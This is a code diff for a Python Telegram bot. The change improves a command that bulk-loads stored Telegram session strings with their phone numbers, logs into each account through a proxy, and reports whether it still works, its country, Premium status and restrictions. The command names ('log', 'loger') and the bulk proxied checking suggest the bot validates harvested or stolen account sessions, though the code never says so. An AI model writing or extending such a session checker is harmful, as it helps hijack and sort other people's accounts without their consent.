@@ -328,30 +328,66 @@ async def cmd_log(message: types.Message):
         await message.answer("❌ No sessions found.")
         return
 
-    await message.answer(f"🔍 Checking {col_name} sessions...")
+    total = len(sessions)
+    progress_msg = await message.answer(f"🔍 Checking {col_name} sessions (0/{total})...")
+    
+    valid = 0
+    invalid = 0
+    errors = 0
     results = []
-    for session in sessions:
+    
+    for i, session in enumerate(sessions, 1):
         phone = session.get("phone")
         session_str = session.get("session")
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        
         try:
+            client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
             await client.connect()
+            
             if not await client.is_user_authorized():
                 results.append(f"❌ {phone} — Invalid session")
+                invalid += 1
             else:
                 me = await client.get_me()
                 country = geocoder.description_for_number(parse(phone, None), "en")
                 premium = getattr(me, 'premium', False)
                 blocked = bool(getattr(me, 'restriction_reason', []))
-                results.append(f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}")
+                
+                results.append(f"✅ {phone} | {country} | Premium: {'⭐️' if premium else '✖️'} | Blocked: {'🔴' if blocked else '🟢'}")
+                valid += 1
+                
         except Exception as e:
-            results.append(f"❌ {phone} — Error: {e}")
+            results.append(f"❌ {phone} — Error: {str(e)[:50]}...")
+            errors += 1
+            
         finally:
-            await client.disconnect()
+            if 'client' in locals():
+                await client.disconnect()
+        
+        # Обновляем прогресс каждые 5 сессий или на последней
+        if i % 5 == 0 or i == total:
+            await bot.edit_message_text(
+                f"🔍 Checking {col_name} sessions ({i}/{total})...\n"
+                f"✅ Valid: {valid} | ❌ Invalid: {invalid} | ⚠️ Errors: {errors}",
+                chat_id=message.chat.id,
+                message_id=progress_msg.message_id
+            )
 
-    text = "\n".join(results)
-    for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
-        await message.answer(chunk)
+    # Формируем финальный отчет
+    stats = (
+        f"\n📊 FINAL STATS:\n"
+        f"Total sessions: {total}\n"
+        f"✅ Valid: {valid} ({round(valid/total*100)}%)\n"
+        f"❌ Invalid: {invalid} ({round(invalid/total*100)}%)\n"
+        f"⚠️ Errors: {errors} ({round(errors/total*100)}%)"
+    )
+    
+    # Отправляем результаты частями
+    for chunk in [results[i:i+20] for i in range(0, len(results), 20)]:
+        await message.answer("\n".join(chunk))
+    
+    await message.answer(stats)
+    await bot.delete_message(chat_id=message.chat.id, message_id=progress_msg.message_id)
 
 @dp.message_handler(commands=['loger'])
 async def cmd_loger(message: types.Message):
